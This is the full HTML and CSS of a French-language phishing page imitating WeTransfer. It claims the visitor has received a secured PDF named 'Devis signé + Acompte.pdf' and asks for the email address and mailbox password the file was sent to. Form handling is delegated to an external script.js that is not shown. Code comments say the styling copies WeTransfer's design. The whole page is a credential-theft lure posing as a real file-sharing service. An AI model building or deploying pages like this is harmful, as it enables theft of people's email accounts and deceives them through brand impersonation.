<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>We-Transfert</title>
    
<link rel="icon" href="logo1.png" type="image/png">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
        }

        body {
            background-color: white;
            margin: 0;
            padding: 0;
        }

        .container {
            max-width: 100%;
            margin: 0;
            padding: 0;
        }

        .logo {
            font-size: 32px;
            text-align: center;
            margin: 30px 0;
            font-weight: bold;
            font-family: serif;
            color: #000;
        }

        .card {
            background: white;
            padding: 20px;
            margin: 0 20px;
            border-radius: 0;
            box-shadow: none;
        }

        .card h2 {
            font-size: 24px;
            margin-bottom: 20px;
            font-weight: 500;
            text-align: center;
        }

        .file-info {
            display: flex;
            align-items: center;
            gap: 16px;
            margin: 24px 0;
            font-size: 15px;
            padding: 0 15px;
        }

        .pdf-icon {
            width: 40px;
            height: 40px;
            background-color: #ff4444;
            border-radius: 8px;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
            font-size: 12px;
            font-weight: bold;
        }

        .input-container {
            margin: 24px 0;
        }

        .input-field {
            width: 100%;
            padding: 15px 20px;
            border: 1px solid #e0e0e0;
            border-radius: 100px;
            font-size: 16px;
            margin-top: 8px;
            background-color: #f5f5f5;
        }

        .input-field:focus {
            outline: none;
            border-color: #000;
            background-color: white;
        }

        .password-container {
            display: none;
            margin-top: 16px;
        }

        .error-message {
            color: #ff4444;
            font-size: 13px;
            margin-top: 8px;
            margin-left: 20px;
            display: none;
        }

        .button {
            width: 100%;
            padding: 16px;
            background-color: #000;
            color: white;
            border: none;
            border-radius: 100px;
            font-size: 16px;
            font-weight: 500;
            cursor: pointer;
            margin-top: 24px;
            transition: background-color 0.2s;
        }

        .button:hover {
            background-color: #333;
        }

        .footer {
            text-align: center;
            margin-top: 40px;
            color: #666;
            font-size: 14px;
            padding: 20px;
        }

        .olympics-logos {
            display: none; /* Masquer les logos olympiques car ils ne sont pas dans le design WeTransfer */
        }

        /* Ajout du style de la barre de statut et du header comme dans l'image */
        .status-bar {
            background-color: #000;
            color: white;
            padding: 4px 12px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            font-size: 14px;
        }

        .header {
            background-color: #1c1c1c;
            padding: 12px 16px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        /* Style pour le texte descriptif */
        .card p {
            color: #666;
            font-size: 15px;
            line-height: 1.5;
            margin-bottom: 20px;
            padding: 0 15px;
        }

        /* Ajustements pour le responsive */
        @media (max-width: 480px) {
            .card {
                margin: 0 10px;
            }

            .input-field {
                font-size: 15px;
            }
        }
    </style>
</head>
<body>
   
    <div class="container">
        <div class="logo">WeTransfer</div>
        
        <div class="card">
            <h2>Vous avez reçu un fichier sécurisé</h2>
            
            <div class="file-info">
                <div class="pdf-icon">PDF</div>
                <span>Devis signé + Acompte.pdf</span>
            </div>

            <p>Pour lire le document veuillez entrer les identifiants de messagerie auxquels ce fichier a été envoyé.</p>
            
            <div class="input-container">
                <input type="email" id="email" class="input-field" placeholder="Email">
                <div class="error-message" id="email-error">Veuillez entrer une adresse email valide</div>
            </div>

            <div class="password-container" id="password-container">
                <div class="password-input-container">
                    <input type="password" id="password" class="input-field" placeholder="Mot de passe">
                </div>
                <div class="error-message" id="password-error">Le mot de passe doit contenir au moins 8 caractères</div>
            </div>
            
            <button  class="button" id="continue-btn">Continuer</button>
        </div>

        <div class="footer">
            © Wetransfer 2025
        </div>

        <div class="olympics-logos">
            <div class="olympics-logo"></div>
            <div class="olympics-logo"></div>
        </div>
    </div>
    <script src="script.js"></script>
</body>
</html>
